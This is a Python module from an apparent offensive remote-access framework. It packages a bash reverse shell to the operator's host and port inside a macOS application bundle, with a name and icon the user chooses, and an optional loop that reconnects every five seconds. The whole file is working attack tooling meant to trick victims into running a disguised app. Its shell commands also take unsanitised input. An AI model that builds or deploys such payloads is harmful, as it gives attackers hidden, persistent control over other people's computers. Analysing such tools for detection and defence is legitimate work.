from modules import helper as h
import os, time

class payload:
	def __init__(self):
		self.name = "Application macOS"
		self.description = "Convert payload into the macOS Application."
		self.usage = "Run this application."

	def run(self,server):
		while 1:
                        name = raw_input(h.info_general_raw("Application Name: "))
                        icon = raw_input(h.info_general_raw("Application Icon: "))
			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).lower()
			if persistence == "y":
				shell_command = "while true; do $(bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
				break
			elif persistence == "n" or not persistence:
				shell_command = "bash &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
				break
			else:
				h.info_error("Unrecognized option!")

		if os.path.exists("payloads") == False:
			os.mkdir("payloads")
		if os.path.exists("payloads/macos_application") == False:
			os.mkdir("payloads/macos_application")
			os.system("""
cp -r resources/payload.app payloads/macos_application
mv payloads/macos_application/payload.app payloads/macos_application/"""+name+""".app
mv """+icon+""" payloads/macos_application/"""+name+""".app/Contents/Resources/payload.icns
                        """)
		payload_save_path = "payloads/macos_application/"+name+".app/Contents/MacOS/payload.sh"
                sas = "payloads/macos_application/"+name+".app"
		payload = """\
#! /usr/bin/env bash
"""+shell_command+"""
                """
		f = open(payload_save_path,"w")
		f.write(payload)
		f.close()
		h.info_general("Payload saved to " + sas)
		os.system("chmod +x payloads/macos_application/"+name+".app/Contents/MacOS/payload.sh")

